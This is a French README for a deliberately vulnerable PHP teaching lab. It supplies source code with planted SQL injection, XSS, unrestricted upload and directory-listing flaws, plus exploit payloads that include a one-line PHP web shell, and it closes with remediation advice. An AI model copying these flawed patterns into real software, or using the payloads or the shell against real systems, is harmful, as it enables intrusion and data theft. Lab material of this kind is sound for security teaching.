# 🔒 VulnLab — TP Vulnérabilités Web

## 📋 Table des matières
1. [Objectif](#objectif)
2. [Environnement](#environnement)
3. [Installation Complète](#installation-complète)
4. [Architecture du Projet](#architecture-du-projet)
5. [Vulnérabilités Implémentées](#vulnérabilités-implémentées)
6. [Guide d'Utilisation](#guide-dutilisation)
7. [Exercices Pratiques](#exercices-pratiques)
8. [Sécurisation](#sécurisation)

---

## 🎯 Objectif

**VulnLab** est une application web **volontairement vulnérable**, conçue comme support de TP pour :
- 🔴 Identifier et comprendre les vulnérabilités web courantes
- 🔵 Pratiquer les exploitations de sécurité
- 🟢 Implémenter les correctifs et bonnes pratiques

**⚠️ ATTENTION :** À utiliser **uniquement en environnement isolé** (VM, réseau privé) !

---

## 🖥️ Environnement

### Prérequis
- **OS** : Linux (Debian/Ubuntu)
- **Serveur web** : Apache2
- **Langage** : PHP 7.4+
- **Base de données** : SQLite3
- **Accès** : sudo/root

### Vérification
```bash
php -v          # PHP doit être installé
apache2 -v      # Apache2 doit être installé
sqlite3 -version # SQLite3 doit être présent
```

---

## 📦 Installation Complète

### Étape 1️⃣ : Installation des packages

```bash
sudo apt update
sudo apt install apache2 php libapache2-mod-php php-sqlite3 sqlite3 -y
```

**Explication :**
- `apache2` : serveur web
- `php` : interpréteur PHP
- `libapache2-mod-php` : module Apache pour PHP
- `php-sqlite3` : driver SQLite pour PHP
- `sqlite3` : base de données légère

---

### Étape 2️⃣ : Activation du service Apache

```bash
sudo systemctl enable --now apache2
sudo systemctl status apache2
```

✅ Apache démarre automatiquement au reboot et s'active immédiatement.

---

### Étape 3️⃣ : Création de l'arborescence

```bash
sudo mkdir -p /var/www/html/vulnlab/uploads
```

Structure générée :
```
/var/www/html/
└── vulnlab/
    ├── config.php
    ├── init_db.php
    ├── index.php
    ├── upload.php
    ├── data.sqlite (créé automatiquement)
    └── uploads/
```

---

### Étape 4️⃣ : Configuration des droits d'accès

```bash
# Droits sur le projet
sudo chown -R $USER:$USER /var/www/html/vulnlab

# Droits spécifiques sur le dossier uploads (Apache peut y écrire)
sudo chown -R www-data:www-data /var/www/html/vulnlab/uploads
sudo chmod -R 775 /var/www/html/vulnlab/uploads
```

| Dossier | Propriétaire | Permissions | Raison |
|---------|-------------|------------|--------|
| `/vulnlab/` | Vous | 755+ | Vous modifiez les fichiers |
| `/uploads/` | www-data | 775 | Apache écrit les uploads |

---

### Étape 5️⃣ : Activation des modules Apache

```bash
# Module pour le directory listing (vulnérabilité intentionnelle)
sudo a2enmod autoindex

# Module pour .htaccess (réécriture d'URL)
sudo a2enmod rewrite

sudo systemctl restart apache2
```

---

### Étape 6️⃣ : Configuration du VirtualHost

Éditer le fichier Apache :
```bash
sudo nano /etc/apache2/sites-available/000-default.conf
```

**Vérifier que ce bloc existe :**
```apache
<Directory /var/www/html/>
    AllowOverride All
    Require all granted
</Directory>
```

Si absent, l'ajouter. Puis redémarrer :
```bash
sudo systemctl restart apache2
```

---

### Étape 7️⃣ : Création du fichier `.htaccess`

Activer le directory listing (volontairement vulnérable) :

```bash
sudo nano /var/www/html/vulnlab/uploads/.htaccess
```

**Contenu :**
```apache
Options +Indexes
IndexOptions FancyIndexing
```

Cela permet de **lister les fichiers** du dossier `/uploads/` depuis le navigateur.

---

### Étape 8️⃣ : Création de `config.php`

```bash
sudo nano /var/www/html/vulnlab/config.php
```

**Contenu :**
```php
<?php
// config.php
// Connexion SQLite pour le TP (volontairement simple)

$dbPath = __DIR__ . "/data.sqlite";

function db(): PDO {
    global $dbPath;
    $db = new PDO("sqlite:" . $dbPath);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    return $db;
}
?>
```

**Rôle :** Centralise la connexion à la base de données.

---

### Étape 9️⃣ : Initialisation de la BDD

Créer le fichier d'initialisation :
```bash
sudo nano /var/www/html/vulnlab/init_db.php
```

**Contenu :**
```php
<?php
require_once __DIR__ . "/config.php";

try {
    $db = db();

    $db->exec("CREATE TABLE IF NOT EXISTS products (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        description TEXT NOT NULL
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS guestbook (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        author TEXT NOT NULL,
        message TEXT NOT NULL,
        created_at TEXT NOT NULL
    )");

    $count = (int)$db->query("SELECT COUNT(*) FROM products")->fetchColumn();
    if ($count === 0) {
        $db->exec("INSERT INTO products (name, description) VALUES
            ('Routeur', 'Routeur simple pour PME.'),
            ('Switch', 'Switch manageable 24 ports.'),
            ('Serveur Web', 'Serveur web de démonstration.'),
            ('Firewall', 'Filtrage réseau (exemple).')
        ");
    }

    echo "<h1>✅ OK — Base initialisée</h1>";
    echo "<p>Ouvre <a href='index.php'>index.php</a></p>";
    echo "<p><b>Ensuite :</b> supprime <code>init_db.php</code> (bonne pratique).</p>";

} catch (Exception $e) {
    http_response_code(500);
    echo "<h1>❌ Erreur</h1><pre>" . htmlspecialchars($e->getMessage()) . "</pre>";
}
?>
```

**Utilisation :**
1. Accéder à `http://<ip>/vulnlab/init_db.php` dans le navigateur
2. La base se crée automatiquement avec données de test
3. ⚠️ **Supprimer ensuite** `init_db.php` (risque de sécurité)

---

### 🔟 Création de `index.php`

```bash
sudo nano /var/www/html/vulnlab/index.php
```

**Contenu :**
```php
<?php
require_once __DIR__ . "/config.php";
$db = db();

/**
 * Vulnérabilités incluses :
 * - SQL Injection : recherche produits (paramètre q)
 * - XSS réfléchie : paramètre hello affiché sans échappement
 * - XSS stockée : livre d'or (sortie non échappée)
 */

// --- XSS stockée : insertion commentaire (volontairement vulnérable) ---
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["author"], $_POST["message"])) {
    $author  = $_POST["author"];   // VULN: pas de validation
    $message = $_POST["message"];  // VULN: pas de validation

    // VULN: requête non préparée
    $sql = "INSERT INTO guestbook (author, message, created_at)
            VALUES ('$author', '$message', datetime('now'))";
    $db->exec($sql);

    header("Location: index.php");
    exit;
}

// --- SQL Injection : recherche (volontairement vulnérable) ---
$q = isset($_GET["q"]) ? $_GET["q"] : "";
if ($q !== "") {
    // VULN: concaténation directe
    $sql = "SELECT id, name, description FROM products
            WHERE name LIKE '%$q%' OR description LIKE '%$q%'";
    $products = $db->query($sql)->fetchAll(PDO::FETCH_ASSOC);
} else {
    $products = $db->query("SELECT id, name, description FROM products")->fetchAll(PDO::FETCH_ASSOC);
}

// --- Lecture guestbook ---
$entries = $db->query("SELECT id, author, message, created_at
                       FROM guestbook ORDER BY id DESC LIMIT 20")
              ->fetchAll(PDO::FETCH_ASSOC);

// --- XSS réfléchie : paramètre affiché sans échappement ---
$hello = isset($_GET["hello"]) ? $_GET["hello"] : "";
?>
<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>VulnLab — TP vulnérabilités web</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: system-ui, Arial, sans-serif; margin: 24px; line-height: 1.45; }
    .warn { background:#fff3cd; border:1px solid #ffeeba; padding:12px; border-radius:10px; }
    .box { border:1px solid #ddd; padding:16px; border-radius:12px; margin:16px 0; }
    input, textarea { width: 100%; padding: 10px; margin: 8px 0; }
    button { padding: 10px 14px; cursor:pointer; }
    code { background:#f6f6f6; padding:2px 6px; border-radius:6px; }
  </style>
</head>
<body>

<h1>VulnLab</h1>
<div class="warn">
  <b>Site volontairement vulnérable</b> (TP). Réseau isolé uniquement.<br>
  Vulnérabilités : SQLi, XSS stockée, XSS réfléchie, upload non sécurisé, directory listing.
</div>

<div class="box">
  <h2>0) XSS réfléchie (paramètre URL)</h2>
  <p>Ce bloc affiche <code>?hello=...</code> <b>sans échappement</b> (volontaire).</p>
  <p><b>Bonjour :</b> <?php echo $hello; ?></p>
</div>

<div class="box">
  <h2>1) Recherche produits (SQL Injection)</h2>
  <form method="get">
    <label>Recherche :</label>
    <input name="q" value="<?php echo htmlspecialchars($q); ?>" placeholder="ex: serveur">
    <button type="submit">Rechercher</button>
  </form>

  <h3>Résultats</h3>
  <ul>
    <?php foreach ($products as $p): ?>
      <li><b><?php echo htmlspecialchars($p["name"]); ?></b> — <?php echo htmlspecialchars($p["description"]); ?></li>
    <?php endforeach; ?>
  </ul>
</div>

<div class="box">
  <h2>2) Livre d'or (XSS stockée)</h2>
  <form method="post">
    <label>Nom :</label>
    <input name="author" placeholder="Votre nom">
    <label>Message :</label>
    <textarea name="message" rows="4" placeholder="Votre message"></textarea>
    <button type="submit">Publier</button>
  </form>

  <h3>Derniers messages</h3>
  <?php foreach ($entries as $e): ?>
    <div class="box">
      <div><b>Auteur :</b> <?php echo $e["author"]; ?></div>
      <div><b>Date :</b> <?php echo htmlspecialchars($e["created_at"]); ?></div>
      <div><b>Message :</b><br><?php echo $e["message"]; ?></div>
    </div>
  <?php endforeach; ?>
</div>

<div class="box">
  <h2>3) Upload sécurisé + Directory</h2>
  <p>Page upload : <a href="upload.php">upload.php</a></p>
  <p>Dossier listé : <a href="uploads/">/uploads/</a></p>
</div>

</body>
</html>
```

---

### 1️⃣1️⃣ Création de `upload.php`

```bash
sudo nano /var/www/html/vulnlab/upload.php
```

**Contenu :**
```php
<?php
// upload.php — volontairement vulnérable
$uploadDir = __DIR__ . "/uploads/";
$msg = "";

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES["file"])) {
    // VULN: aucun contrôle (extension, type MIME, taille, nom...)
    $name = $_FILES["file"]["name"];
    $tmp  = $_FILES["file"]["tmp_name"];

    if (is_uploaded_file($tmp)) {
        if (move_uploaded_file($tmp, $uploadDir . $name)) {
            $msg = "Fichier uploadé : <a href='uploads/$name'>uploads/$name</a>";
        } else {
            $msg = "Erreur upload.";
        }
    } else {
        $msg = "Aucun fichier valide.";
    }
}
?>
<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>VulnLab — Upload</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: system-ui, Arial, sans-serif; margin: 24px; }
    .box { border:1px solid #ddd; padding:16px; border-radius:12px; margin:16px 0; }
    input { width:100%; padding:10px; margin:8px 0; }
    button { padding:10px 14px; cursor:pointer; }
    .warn { background:#fff3cd; border:1px solid #ffeeba; padding:12px; border-radius:10px; }
  </style>
</head>
<body>

<h1>Upload (volontairement non sécurisé)</h1>
<div class="warn">
  Ici, l'upload n'a <b>aucun contrôle</b>. Objectif TP : constater le risque et proposer une sécurisation.
</div>

<div class="box">
  <form method="post" enctype="multipart/form-data">
    <label>Choisir un fichier :</label>
    <input type="file" name="file" required>
    <button type="submit">Uploader</button>
  </form>
  <p><?php echo $msg; ?></p>
</div>

<div class="box">
  <p>Retour : <a href="index.php">index.php</a></p>
  <p>Dossier : <a href="uploads/">/uploads/</a> (directory listing)</p>
</div>

</body>
</html>
?>
```

---

## 🏗️ Architecture du Projet

```
vulnlab/
│
├── 📄 config.php
│   └─ Connexion centralisée à SQLite
│
├── 📄 init_db.php
│   └─ Script d'initialisation (⚠️ à supprimer après)
│
├── 📄 index.php (PAGE PRINCIPALE)
│   ├─ XSS réfléchie (paramètre ?hello=)
│   ├─ SQL Injection (recherche produits)
│   └─ XSS stockée (livre d'or)
│
├── 📄 upload.php
│   └─ Upload sans validation (volontaire)
│
├── 📁 uploads/ (dossier avec directory listing)
│   └─ Fichiers uploadés visibles
│
└── 📦 data.sqlite
    ├─ products
    └─ guestbook
```

---

## 🔓 Vulnérabilités Implémentées

### 1️⃣ **SQL Injection (SQLi)**

#### 📍 Localisation : `index.php` → Recherche produits

**Code vulnérable :**
```php
$q = $_GET["q"];
$sql = "SELECT * FROM products WHERE name LIKE '%$q%'";
$db->query($sql);
```

**Exploitation :**
```
http://localhost/vulnlab/index.php?q=' OR '1'='1
```

**Impact :** Affiche tous les produits sans restriction.

**Exemple avancé :**
```
?q=' UNION SELECT name, password FROM users WHERE '1'='1
```

---

### 2️⃣ **XSS Réfléchie**

#### 📍 Localisation : `index.php` → Paramètre `?hello=`

**Code vulnérable :**
```php
$hello = $_GET["hello"];
echo $hello;  // Pas d'échappement !
```

**Exploitation :**
```
http://localhost/vulnlab/index.php?hello=<script>alert('XSS')</script>
```

**Impact :** Exécution de JavaScript dans le navigateur.

**Variante :**
```
?hello=<img src=x onerror="alert('XSS')">
```

---

### 3️⃣ **XSS Stockée**

#### 📍 Localisation : `index.php` → Livre d'or

**Code vulnérable :**
```php
// Insertion sans validation
$author = $_POST["author"];
$message = $_POST["message"];
$sql = "INSERT INTO guestbook VALUES ('$author', '$message', ...)";
$db->exec($sql);

// Affichage sans échappement
echo $e["message"];  // ❌ Pas d'htmlspecialchars()
```

**Exploitation :**
1. Publier un message contenant du HTML/JS :
   ```html
   <img src=x onerror="alert('XSS stockée')">
   ```
2. Le code s'exécute à **chaque visite** de la page

**Impact :** Persistant, affecte tous les visiteurs.

---

### 4️⃣ **Upload sans validation**

#### 📍 Localisation : `upload.php`

**Code vulnérable :**
```php
$name = $_FILES["file"]["name"];  // Aucun contrôle
move_uploaded_file($tmp, $uploadDir . $name);
```

**Risques :**
- 🔴 Upload de `.php` → Exécution de code
- 🔴 Traversée de répertoire : `../../etc/passwd`
- 🔴 Overwrite de fichiers existants
- 🔴 Fichiers exécutables

**Exploitation :**
1. Créer un fichier `shell.php` :
   ```php
   <?php system($_GET["cmd"]); ?>
   ```
2. L'uploader
3. Accéder à `http://localhost/vulnlab/uploads/shell.php?cmd=id`

---

### 5️⃣ **Directory Listing**

#### 📍 Localisation : `/uploads/.htaccess`

```apache
Options +Indexes
IndexOptions FancyIndexing
```

**Impact :**
- 📂 Lister tous les fichiers du dossier
- 👁️ Découvrir les fichiers uploadés
- 🎯 Trouver les shells/backdoors

**URL :**
```
http://localhost/vulnlab/uploads/
```

---

## 📖 Guide d'Utilisation

### ✅ Vérification initiale

```bash
# 1. Vérifier PHP
php -v

# 2. Vérifier Apache
sudo systemctl status apache2

# 3. Accéder à la page test
curl http://localhost/vulnlab/
```

### 🚀 Initialiser la BDD

1. Accéder à : `http://<IP_VM>/vulnlab/init_db.php`
2. Voir le message ✅ OK
3. **Supprimer** `init_db.php` :
   ```bash
   sudo rm /var/www/html/vulnlab/init_db.php
   ```

### 🌐 Accéder à l'application

```
http://<IP_VM>/vulnlab/
```

**Pages disponibles :**
- `index.php` → Accueil (XSS, SQLi, livre d'or)
- `upload.php` → Upload de fichiers
- `uploads/` → Directory listing

---

## 🎓 Exercices Pratiques

### Exercice 1 : SQL Injection Basique

**Objectif :** Récupérer tous les produits avec `OR '1'='1`

1. Accéder à la page d'accueil
2. Dans la recherche, entrer :
   ```
   ' OR '1'='1
   ```
3. 📊 Observer : tous les produits s'affichent

**Comprendre :** La requête devient :
```sql
SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'
```

---

### Exercice 2 : XSS Réfléchie

**Objectif :** Exécuter du JavaScript via l'URL

1. Utiliser ce lien :
   ```
   http://localhost/vulnlab/index.php?hello=<h1>HACKED</h1>
   ```
2. 📄 Observer : le titre s'affiche en rouge

**Escalade :**
```
?hello=<script>alert('XSS Réfléchie')</script>
```

---

### Exercice 3 : XSS Stockée

**Objectif :** Persister une attaque XSS dans le livre d'or

1. Aller à l'onglet "Livre d'or"
2. Publier :
   - **Nom :** `Attaquant`
   - **Message :** `<img src=x onerror="alert('XSS Stockée')">`
3. 🔄 Actualiser la page → l'alerte s'exécute
4. 👥 Tous les visiteurs voient l'alerte

---

### Exercice 4 : Injection SQL Avancée (UNION)

**Objectif :** Afficher d'autres données avec UNION

1. Recherche (si la table users existait) :
   ```
   ' UNION SELECT id, username FROM users WHERE '1'='1
   ```

---

### Exercice 5 : Upload de Shell PHP

**Objectif :** Télécharger un shell et l'exécuter

1. Créer un fichier `shell.php` :
   ```php
   <?php system($_GET["cmd"]); ?>
   ```
2. L'uploader via `upload.php`
3. Accéder à : `http://localhost/vulnlab/uploads/shell.php?cmd=id`
4. 💻 Voir le résultat de la commande `id`

---

### Exercice 6 : Directory Listing

**Objectif :** Lister tous les fichiers uploadés

1. Accéder à : `http://localhost/vulnlab/uploads/`
2. 📂 Voir l'arborescence complète
3. 👁️ Identifier les shells ou fichiers suspects

---

## 🛡️ Sécurisation

### 1️⃣ Prévenir SQL Injection

**❌ Avant (vulnérable) :**
```php
$q = $_GET["q"];
$sql = "SELECT * FROM products WHERE name LIKE '%$q%'";
```

**✅ Après (sécurisé) :**
```php
$q = $_GET["q"];
$stmt = $db->prepare("SELECT * FROM products WHERE name LIKE ?");
$stmt->execute(["%$q%"]);
$products = $stmt->fetchAll();
```

---

### 2️⃣ Prévenir XSS Réfléchie & Stockée

**❌ Avant :**
```php
echo $user_input;  // ❌ Pas sûr
```

**✅ Après :**
```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

**Ou en templates Twig/Blade :** échappement auto.

---

### 3️⃣ Sécuriser l'Upload

**✅ Checklist :**
```php
function secureUpload($file) {
    // 1. Vérifier la taille
    if ($file['size'] > 5_000_000) {
        return "Fichier trop volumineux";
    }

    // 2. Vérifier l'extension
    $allowed = ['jpg', 'png', 'pdf'];
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowed)) {
        return "Extension non autorisée";
    }

    // 3. Renommer le fichier
    $newName = uniqid() . '.' . $ext;

    // 4. Vérifier le type MIME
    $mime = mime_content_type($file['tmp_name']);
    if (!in_array($mime, ['image/jpeg', 'image/png', 'application/pdf'])) {
        return "Type MIME invalide";
    }

    // 5. Uploader dans un dossier non exécutable
    move_uploaded_file($file['tmp_name'], "/var/www/uploads/$newName");
    
    return "✅ OK";
}
```

---

### 4️⃣ Désactiver Directory Listing

**❌ Avant :**
```apache
Options +Indexes
```

**✅ Après :**
```apache
Options -Indexes
```

Ou supprimer le `.htaccess`.

---

### 5️⃣ Validation des Entrées

```php
// Valider & nettoyer
$author = trim(strip_tags($_POST["author"]));
if (strlen($author) < 2 || strlen($author) > 50) {
    die("Nom invalide");
}

$message = trim(strip_tags($_POST["message"]));
if (strlen($message) < 5 || strlen($message) > 500) {
    die("Message invalide");
}
```

---

## 📝 Checklist Finale

- [ ] Apache2 installé et actif
- [ ] PHP et php-sqlite3 installés
- [ ] Dossier `/vulnlab` créé avec permissions
- [ ] Tous les fichiers (config.php, index.php, etc.) créés
- [ ] Base de données initialisée (puis init_db.php supprimé)
- [ ] `http://<IP>/vulnlab/` accessible
- [ ] XSS réfléchie fonctionnelle (paramètre hello)
- [ ] SQL Injection testée (recherche)
- [ ] Livre d'or opérationnel (XSS stockée)
- [ ] Upload fonctionnel
- [ ] Directory listing visible dans `/uploads/`

---

## 🎯 Conclusion

**VulnLab** est un excellent outil pédagogique pour :
- ✅ Comprendre les attaques réelles
- ✅ Pratiquer en toute sécurité
- ✅ Implémenter les correctifs
- ✅ Sensibiliser aux bonnes pratiques

**⚠️ RAPPEL :** Ne jamais déployer sur Internet. Réseau isolé uniquement !

---

## 📚 Ressources supplémentaires

- **OWASP Top 10** : https://owasp.org/www-project-top-ten/
- **PHP PDO** : https://www.php.net/manual/fr/book.pdo.php
- **SQLi Prévention** : https://owasp.org/www-community/attacks/SQL_Injection
- **XSS Prévention** : https://owasp.org/www-community/attacks/xss/

---

**Bon TP ! 🚀**
